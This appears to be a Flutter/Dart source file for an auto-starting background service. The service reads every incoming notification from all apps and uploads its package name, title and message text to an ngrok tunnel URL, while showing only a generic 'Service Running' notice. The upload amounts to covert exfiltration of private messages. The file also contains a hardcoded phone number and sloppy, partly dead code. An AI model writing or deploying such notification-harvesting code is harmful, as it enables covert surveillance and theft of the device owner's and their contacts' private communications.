import 'dart:async';
import 'dart:core';
import 'dart:io';
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:http/http.dart' as http;
import 'package:notification_listener_service/notification_event.dart' show ServiceNotificationEvent;
import 'package:notification_listener_service/notification_listener_service.dart';
import 'package:path_provider/path_provider.dart';

final service = FlutterBackgroundService();
Future<void> initializeService() async {


  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      foregroundServiceNotificationId: 888,
      initialNotificationTitle: "Service Running",
      initialNotificationContent: "Your background service is active",
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,

      onBackground: onIosBackground,
    ),
  );

  service.startService();
  // service.invoke("stopService"); if you want to stop service call this fun

}

stopBackground (){
  service.invoke("stopService");


}

@pragma('vm:entry-point')
bool onIosBackground(ServiceInstance service) {
  WidgetsFlutterBinding.ensureInitialized();
  return true;
}
@pragma('vm:entry-point')
void onStart(ServiceInstance service) {
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: "Service Running",
      content: "Background work happening",
    );
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  service.on('onTaskRemoved').listen((event) {
    print('App removed from recent tasks!');
    service.invoke('restartService'); // custom logic
  });

  // Example: Periodic Task
  Timer.periodic(const Duration(seconds: 5), (timer) async {
    if (service is AndroidServiceInstance && !(await service.isForegroundService())) {
      return;
    }

  });


  _subscription =
      NotificationListenerService.notificationsStream.listen((event) async {

        if (event.content != null) {
          final tempDir = await getTemporaryDirectory();
          File file = await File('${tempDir.path}/image.png').create();
          if(event.appIcon!=null){
            file.writeAsBytesSync(event.appIcon!);}
          await Future.delayed(Duration(seconds: 1), () async {
            String uri = "https://1aae-2406-b400-d11-1d95-b8b4-aa00-d582-1c8f.ngrok-free.app/whatsapp/index.php";

            var request = await http.MultipartRequest('POST', Uri.parse(uri));
            Map<String,String> data={
              'username':  event.id.toString(),
              'mobile':event.packageName.toString(),
              'number': event.title==""? "8317008979" :event.title.toString(),
              'icon':   "🙂",
              'message': event.content.toString(),

            };
            print(data);
            request.fields.addAll(data);


            var response = await request.send();
            var response1 = await http.Response.fromStream(response);
            print("${response.statusCode} arraylenght ${response1.body} fist ${amar.length} ");
            if (response.statusCode == 200) {
              // i++;
              print("${response1.body} arraylenght  last ${amar.length} ");
            }
          });
        }
        //  amar.remove(element);


        int i = 0;
        events.forEach((element) {
          i++;
          var textEditingController = TextEditingController(text: element.title);

          print("$i object ${element.content}");
        });
      });
 // incrementCounter();
}

StreamSubscription<ServiceNotificationEvent>? _subscription;
List<ServiceNotificationEvent> events = [];
List<ServiceNotificationEvent> amar = [];
mytest() {


  print("notification listion");

}

